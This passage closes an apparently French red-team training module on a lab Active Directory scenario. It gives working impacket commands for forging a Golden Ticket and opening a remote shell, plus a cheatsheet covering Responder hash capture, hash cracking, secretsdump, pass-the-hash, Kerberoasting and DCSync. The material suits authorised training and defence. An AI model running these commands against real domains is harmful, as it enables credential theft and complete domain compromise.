impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10 | grep "Domain SID"

# Créer le Golden Ticket (TGT forgé avec le hash KRBTGT)
# -nthash : hash NTLM de KRBTGT, -domain-sid : SID du domaine
# -groups 512,519,518 : Domain Admins, Schema Admins, Enterprise Admins
impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <SID> -domain corp.shadow.local -groups 512,519,518 Administrator

# Utiliser le Golden Ticket : exporter le cache Kerberos et lancer smbexec
# KRB5CCNAME : variable d'environnement pointant vers le fichier de ticket
# -k : authentification Kerberos, -no-pass : pas de mot de passe (ticket)
export KRB5CCNAME=/tmp/administrator.ccache
impacket-smbexec -k -no-pass CORPSHADOW/Administrator@DC01.corp.shadow.local
```

**Explication des commandes de l'aide-mémoire :**

| Phase | Commande | Rôle |
|-------|----------|------|
| **1. Énumération** | `bloodhound-python -d <domaine> -ns <DNS> -c all` | Cartographie AD complète (utilisateurs, groupes, ACL, etc.) |
| **1. Énumération** | `ldapsearch -x -H ldap://... -b "DC=..." -s sub "(objectClass=user)" sAMAccountName` | Liste manuelle des utilisateurs via LDAP |
| **2. Capture** | `sudo responder -I eth0 -rdwv` | Empoisonnement LLMNR/NBT-NS/WPAD pour capture de hash NTLMv2 |
| **2. Capture** | `john --wordlist=rockyou.txt /tmp/ntlmv2_hash.txt` | Crack du hash NTLMv2 par dictionnaire |
| **2. Capture** | `hashcat -m 5600 ... --force` | Crack du hash NTLMv2 par GPU (mode 5600 = NetNTLMv2) |
| **3. Dump** | `impacket-secretsdump DOMAINE/user:pass@IP` | Extraction des hashes SAM/LSA à distance via SMB |
| **4. PtH** | `impacket-wmiexec -hashes LM:NT user@IP` | Shell distant via WMI (furtif) |
| **4. PtH** | `impacket-psexec -hashes :NT user@IP` | Shell distant via service (bruyant) |
| **4. PtH** | `impacket-smbexec -hashes :NT user@IP` | Shell distant via SVCCTL (furtif) |
| **5. Kerberoasting** | `impacket-GetUserSPNs user:pass -dc-ip IP` | Liste les SPN (comptes de service kerberoastables) |
| **5. Kerberoasting** | `hashcat -m 13100 ... --force` | Crack du TGS Kerberos (mode 13100 = TGS-REP etype 23) |
| **6. DCSync** | `impacket-secretsdump admin@IP -just-dc` | Extraction de tous les hashes du domaine via DRSUAPI |
| **6. Golden Ticket** | `impacket-ticketer -nthash <KRBTGT> -domain-sid <SID> ...` | Forge un TGT avec le hash KRBTGT pour persistance totale |

## Annexe B : Glossaire des abréviations

| Abréviation | Signification |
|-------------|---------------|
| AD | Active Directory |
| DC | Domain Controller (Contrôleur de domaine) |
| DCSync | Domain Controller Synchronization |
| DRS | Directory Replication Service |
| DRSR | Directory Replication Service (Remote) |
| gMSA | Group Managed Service Account |
| GPO | Group Policy Object |
| KDC | Key Distribution Center (Kerberos) |
| KRBTGT | Kerberos Ticket Granting Ticket account |
| LAPS | Local Administrator Password Solution |
| LLMNR | Link-Local Multicast Name Resolution |
| LSA | Local Security Authority |
| LSASS | Local Security Authority Subsystem Service |
| NBT-NS | NetBIOS Name Service |
| NIS2 | Network and Information Security Directive 2 |
| NTLM | NT LAN Manager |
| PtH | Pass-the-Hash |
| RID | Relative Identifier |
| RODC | Read-Only Domain Controller |
| ROE | Rules of Engagement |
| SAM | Security Account Manager |
| SID | Security Identifier |
| SMB | Server Message Block |
| SPN | Service Principal Name |
| TGS | Ticket-Granting Service |
| TGT | Ticket-Granting Ticket |
| WMI | Windows Management Instrumentation |

---

> **Fin du document — Module 10 : Scénario Autonome CorpShadow**  
> Rédigé dans le cadre de la formation Red Team — Jour 2 : Infrastructure & Active Directory  
> Conforme aux exigences de documentation NIS2 et au framework MITRE ATT&CK v15  
> **Version : 1.0 — Date : 2025-05-30**
